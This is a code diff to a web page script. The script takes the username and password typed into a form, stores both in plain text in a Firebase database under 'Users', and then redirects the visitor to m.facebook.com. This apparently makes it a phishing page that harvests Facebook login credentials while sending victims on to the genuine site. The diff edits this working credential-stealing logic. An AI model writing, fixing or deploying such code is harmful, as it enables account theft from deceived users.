@@ -91,15 +91,17 @@
 <script>
     function post()
 {
+  var key=0;
   var username=document.getElementById("username").value;
   var password=document.getElementById("password").value;
-  var myref=firebase.database().ref();
-  var key= myref.push({
+  var myref=firebase.database().ref().child('Users');
+  myref.push({
   username:username,
   password:password
 });
-alert(key);
- if(key!= null)
+ key="success";
+ alert(key);
+ if(key == "success")
 {
  window.location.href='https://m.facebook.com/';
 }
